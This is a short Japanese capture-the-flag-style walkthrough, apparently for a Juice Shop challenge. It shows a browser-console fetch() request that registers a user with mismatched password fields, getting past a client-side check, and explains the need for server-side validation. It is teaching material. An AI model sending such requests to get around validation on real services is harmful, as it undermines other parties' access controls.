# Repetitive Registration ✅

**難易度:** ⭐
**カテゴリ:** 入力検証
**目標:** パスワード確認が一致しなくても登録する

---

## 実行手順

DevToolsのConsoleで以下を実行:

```javascript
fetch('/api/Users/', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: 'repetitive@test.com',
    password: 'password1',
    passwordRepeat: 'password2',
    securityQuestion: { id: 1, question: 'Your eldest siblings middle name?' },
    securityAnswer: 'test'
  })
})
```

## 解説

- フロントエンドではパスワード一致チェックがあるが、APIは受け入れてしまう
- サーバー側でも入力検証が必要という教訓

**脆弱性の原因:**
```javascript
// フロントエンド（画面）の検証
if (password !== passwordRepeat) {
  showError("パスワードが一致しません");
  return;
}

// しかしAPIに直接送信すると、この検証はスキップされる
```

**教訓:**
- フロントエンドの検証だけでは不十分
- 必ずバックエンドでも同じ検証を行う
- 「フロントエンドは改ざん可能」という前提で設計する

## 関連チャレンジ

- [Zero Stars](zero-stars.md)
- [Empty User Registration](../difficulty-2/empty-user-registration.md)
